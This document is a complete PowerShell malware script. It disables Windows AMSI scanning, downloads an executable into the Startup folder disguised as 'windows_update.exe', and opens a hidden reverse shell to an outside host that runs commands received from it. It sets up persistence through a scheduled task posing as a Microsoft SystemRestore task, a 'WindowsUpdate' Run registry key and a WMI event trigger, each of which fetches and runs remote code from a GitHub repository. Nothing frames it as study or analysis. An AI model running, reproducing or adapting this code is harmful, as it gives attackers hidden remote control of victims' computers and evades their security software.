# ================================================
# AMSI Bypass (Silent Patch)
# ================================================
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ================================================
# Download EXE to Startup Folder (Persistent Execution)
# ================================================
function Install-Startup-Exe {
    $exeUrl = "https://github.com/mitasahi/root/raw/refs/heads/main/oihFon.exe"
    $startupPath = [Environment]::GetFolderPath('Startup')
    $destPath = Join-Path $startupPath "windows_update.exe"

    try {
        # Download with fallback methods
        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing
        } catch {
            (New-Object Net.WebClient).DownloadFile($exeUrl, $destPath)
        }

        # Execute immediately if download succeeded
        if (Test-Path $destPath) {
            Start-Process -WindowStyle Hidden -FilePath $destPath
        }
    } catch {}
}

# Install and execute
Install-Startup-Exe

# ================================================
# Reverse Shell Payload (Fileless Execution)
# ================================================
$reverseShell = {
    $client = New-Object System.Net.Sockets.TCPClient('engineering-ebay.gl.at.ply.gg', 62628)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | %{0}
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (iex $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
}

Start-Process -WindowStyle Hidden $PSHOME\powershell.exe -ArgumentList "-nop -c & {$reverseShell}"

# ================================================
# Auto-Update from GitHub (Every 30 Minutes)
# ================================================
$updateScript = {
    while($true) {
        try {
            # Create temp folder
            $tempDir = "$env:TEMP\$(New-Guid)"
            New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
            
            # Download and extract tar.gz
            $tarUrl = "https://github.com/mitasahi/root/raw/main/ps-persist.ps1.tar.gz"
            $tarPath = "$tempDir\ps-persist.tar.gz"
            Invoke-WebRequest -Uri $tarUrl -OutFile $tarPath -UseBasicParsing
            
            # Extract using built-in tar (Windows 10+)
            tar -xf $tarPath -C $tempDir
            
            # Execute the script
            $scriptPath = "$tempDir\ps-persist.ps1"
            if (Test-Path $scriptPath) {
                iex (Get-Content -Raw -Path $scriptPath)
            }
            
            # Cleanup
            Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
        } catch {}
        Start-Sleep -Seconds 1800  # 30 minutes
    }
}

# ================================================
# Persistence (Registry + Scheduled Task)
# ================================================
# 1. Scheduled Task (30-Minute Updates)
schtasks /create /tn "Microsoft\Windows\SystemRestore\SR" /tr "powershell -w hidden -c & {$updateScript}" /sc minute /mo 30 /ru SYSTEM /f

# 2. Registry Persistence (For Reboot Survival)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdate"
$regValue = "powershell -w hidden -c iex (irm 'https://github.com/mitasahi/root/raw/main/ps-persist.ps1.tar.gz')"

# Remove existing entry if it exists
if (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue) {
    Remove-ItemProperty -Path $regPath -Name $regName
}

# Create new persistence entry
New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null

# ================================================
# Fallback: Basic WMI Event (If Needed)
# ================================================
try {
    Register-WmiEvent -Query "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'" `
                     -SourceIdentifier "PersistenceTrigger" `
                     -Action {
                        Start-Process -WindowStyle Hidden powershell.exe `
                                      -ArgumentList "-nop -c iex (irm 'https://github.com/mitasahi/root/raw/main/ps-persist.ps1.tar.gz')"
                     } -ErrorAction SilentlyContinue
} catch {}
